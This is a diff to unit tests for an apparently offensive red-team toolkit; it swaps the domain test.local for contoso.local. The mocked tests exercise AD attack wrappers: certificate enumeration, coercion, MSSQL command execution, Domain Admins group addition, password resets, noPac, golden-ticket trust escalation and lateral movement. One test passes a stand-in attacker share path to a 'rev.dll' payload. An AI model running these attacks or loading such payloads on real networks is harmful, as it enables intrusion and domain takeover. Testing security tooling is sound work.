@@ -26,7 +26,7 @@ def red_team_state() -> RedTeamState:
     """Create a basic red team state for testing."""
     return RedTeamState(
         operation_id="op-test-001",
-        target=Target(ip="192.168.56.100", hostname="dc01", domain="test.local"),
+        target=Target(ip="192.168.56.100", hostname="dc01", domain="contoso.local"),
         started_at=datetime.now(timezone.utc),
         stage=InvestigationStage.TRIAGE,
         hosts=[],
@@ -371,7 +371,7 @@ class TestCertipyTools:
         tools.set_state(red_team_state)
 
         result = tools.certipy_find(
-            domain="test.local",
+            domain="contoso.local",
             username="user",
             password="password",  # pragma: allowlist secret
             dc_ip="192.168.56.10",
@@ -691,7 +691,7 @@ class TestCoercionTools:
                 "192.168.56.100",
                 username="user",
                 password="pass",  # pragma: allowlist secret
-                domain="test.local",
+                domain="contoso.local",
             )
 
         assert "success" in result.lower()
@@ -725,7 +725,7 @@ class TestCoercionTools:
                 "192.168.56.100",
                 "user",
                 "pass",  # pragma: allowlist secret
-                "test.local",
+                "contoso.local",
             )
 
         assert "triggered" in result.lower()
@@ -744,7 +744,7 @@ class TestCoercionTools:
                 "192.168.56.100",
                 "user",
                 "pass",  # pragma: allowlist secret
-                "test.local",
+                "contoso.local",
             )
 
         assert "failed" in result.lower()
@@ -782,7 +782,7 @@ class TestMSSQLTools:
                 "user",
                 "pass",  # pragma: allowlist secret
                 "whoami",
-                domain="test.local",
+                domain="contoso.local",
             )
 
         assert "system" in result.lower()
@@ -818,7 +818,7 @@ class TestMSSQLTools:
                 "192.168.56.22",
                 "user",
                 "pass",  # pragma: allowlist secret
-                domain="test.local",
+                domain="contoso.local",
             )
 
         assert "enabled" in result.lower() or "changed" in result.lower()
@@ -872,7 +872,7 @@ class TestACLExploitTools:
             )
             result = tools.pywhisker(
                 "Administrator",
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -891,7 +891,7 @@ class TestACLExploitTools:
             mock_run.side_effect = Exception("Access denied")
             result = tools.pywhisker(
                 "Administrator",
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -913,7 +913,7 @@ class TestACLExploitTools:
             result = tools.bloodyad_add_group_member(
                 "controlled_user",
                 "Domain Admins",
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -933,7 +933,7 @@ class TestACLExploitTools:
             result = tools.bloodyad_add_group_member(
                 "user",
                 "Domain Admins",
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -955,7 +955,7 @@ class TestACLExploitTools:
             result = tools.bloodyad_set_password(
                 "target_user",
                 "NewP@ss123!",  # pragma: allowlist secret
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -975,7 +975,7 @@ class TestACLExploitTools:
             result = tools.bloodyad_set_password(
                 "target_user",
                 "NewP@ss123!",  # pragma: allowlist secret
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -1015,7 +1015,7 @@ class TestCVEExploitTools:
                 return_code=0,
             )
             result = tools.nopac(
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -1034,7 +1034,7 @@ class TestCVEExploitTools:
         with patch("ares.tools.red.common.run_remote") as mock_run:
             mock_run.side_effect = Exception("Target patched")
             result = tools.nopac(
-                "test.local",
+                "contoso.local",
                 "user",
                 "pass",  # pragma: allowlist secret
                 "192.168.56.10",
@@ -1056,7 +1056,7 @@ class TestCVEExploitTools:
                 "192.168.56.22",
                 "user",
                 "pass",  # pragma: allowlist secret
-                "test.local",
+                "contoso.local",
                 "\\\\attacker\\share\\rev.dll",
             )
 
@@ -1075,7 +1075,7 @@ class TestCVEExploitTools:
                 "192.168.56.22",
                 "user",
                 "pass",  # pragma: allowlist secret
-                "test.local",
+                "contoso.local",
                 "\\\\attacker\\share\\rev.dll",
             )
 
@@ -1112,7 +1112,7 @@ class TestTrustAttackTools:
                 stdout="Enterprise Admin golden ticket created", return_code=0
             )
             result = tools.raise_child(
-                "child.test.local",
+                "child.contoso.local",
                 "administrator",
                 "pass",  # pragma: allowlist secret
             )
@@ -1129,10 +1129,10 @@ class TestTrustAttackTools:
         with patch("ares.tools.red.common.run_remote") as mock_run:
             mock_run.return_value = MockRunResult(stdout="Escalation successful", return_code=0)
             result = tools.raise_child(
-                "child.test.local",
+                "child.contoso.local",
                 "administrator",
                 "pass",  # pragma: allowlist secret
-                target_domain="test.local",
+                target_domain="contoso.local",
             )
 
         assert "success" in result.lower() or "escalation" in result.lower()
@@ -1147,7 +1147,7 @@ class TestTrustAttackTools:
         with patch("ares.tools.red.common.run_remote") as mock_run:
             mock_run.side_effect = Exception("Trust not found")
             result = tools.raise_child(
-                "child.test.local",
+                "child.contoso.local",
                 "administrator",
                 "pass",  # pragma: allowlist secret
             )
@@ -1250,7 +1250,7 @@ class TestLateralMovementTools:
                 "192.168.56.10",
                 "administrator",
                 password="pass",  # pragma: allowlist secret
-                domain="test.local",
+                domain="contoso.local",
                 command="whoami",
             )
 
